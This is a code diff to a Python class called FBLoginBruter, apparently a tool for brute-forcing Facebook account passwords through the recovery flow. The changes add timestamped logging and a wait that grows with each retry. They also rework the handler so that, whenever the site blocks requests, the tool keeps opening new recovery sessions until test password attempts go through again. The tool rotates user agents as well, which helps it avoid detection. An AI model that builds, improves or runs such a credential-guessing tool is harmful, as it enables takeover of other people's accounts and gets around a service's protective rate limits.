@@ -1,3 +1,4 @@
+import datetime
 import argparse
 import platform
 import time
@@ -21,15 +22,18 @@ class FBLoginBruter:
         self.verbose = verbose
         self.bs4_parser = "html.parser" if platform.system() == "Windows" else "lxml"
     
+    def _log(self, level, msg, end="\n"):
+        print(f"[{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] {level!s}: {msg!s}", end=end)
+    
     def debug(self, msg, end="\n"):
         if self.verbose:
-            print(f"DEBUG: {msg!s}", end=end)
+            self._log("DEBUG", msg, end)
     
     def info(self, msg, end="\n"):
-        print(f"INFO: {msg!s}", end=end)
+        self._log("INFO", msg, end)
     
     def warning(self, msg, end="\n"):
-        print(f"WARNING: {msg!s}", end=end)
+        self._log("WARNING", msg, end)
 
     def _initiate_user_agent_rotator(self):
         software_names = (SoftwareName.FIREFOX.value, SoftwareName.CHROME.value, SoftwareName.SAFARI.value)
@@ -38,10 +42,12 @@ class FBLoginBruter:
         return UserAgent(software_names=software_names, operating_systems=operating_systems, popularity=popularity)
     
     def _initiate_recover_session_with_retries(self):
+        c = 0
         while not self._initiate_recover_session():
-            self.info("Could not initiate initial recover session.")
-            self.info("Sleeping for 60 seconds...", end="\r")
-            time.sleep(60)
+            c += 1
+            self.info("Could not initiate new recover session", end="\r")
+            self.info(f"Sleeping for {str(self.blocked_pause_time_step*c)} seconds...", end="\r")
+            time.sleep(self.blocked_pause_time_step * c)
 
     def _initiate_recover_session(self):
         self.ses = requests.Session()
@@ -96,17 +102,8 @@ class FBLoginBruter:
 
     def _handle_blocked(self):
         self.warning("We are blocked!")
-        c = 0
-        while True:
-            c += 1
-            self.info(f"Sleeping {str(self.blocked_pause_time_step*c)} seconds...", end="\r")
-            time.sleep(self.blocked_pause_time_step * c)
-            self.debug("Initiate new recover session...", end="\r")
-            if not self.initiate_recover_session():
-                self.warning("Could not initiate new recover session", end="\r")
-                continue
-            if not self._is_request_blocked(self.try_pass("test")[1]):
-                break
+        while self._is_request_blocked(self.try_pass("test")[1]):
+            self._initiate_recover_session_with_retries()
         self.info("We are unblocked :) Continue...")
     
     def _estimate_time_for_wordlist_length(self, length):
